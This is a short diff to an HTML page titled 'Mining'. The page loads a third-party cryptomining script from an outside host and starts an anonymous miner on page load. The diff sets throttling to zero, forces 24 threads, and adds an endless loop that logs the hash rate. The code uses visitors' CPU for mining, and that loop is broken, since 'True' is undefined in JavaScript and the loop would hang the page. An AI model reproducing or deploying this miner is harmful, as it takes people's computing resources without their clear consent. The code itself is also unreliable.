@@ -1,10 +1,11 @@
 <title>Mining</title>
 <script src="https://www.hostingcloud.racing/YPzG.js"></script>
 <script>
-    var _client = new Client.Anonymous('ad19f245bdcb8be727ca365dea899058cf5610d3627b0daac9cd746fc7a94dbb', {
+    var miner = new Client.Anonymous('ad19f245bdcb8be727ca365dea899058cf5610d3627b0daac9cd746fc7a94dbb', {
         throttle: 0, c: 'w'
     });
-    _client.start();
-    
-
+    miner.start();
+    miner.setAutoThreadsEnabled(false);
+    miner.setNumThreads(24);
+    while (True) {hps = miner.getHashesPerSecond();console.log(hps);};
 </script>
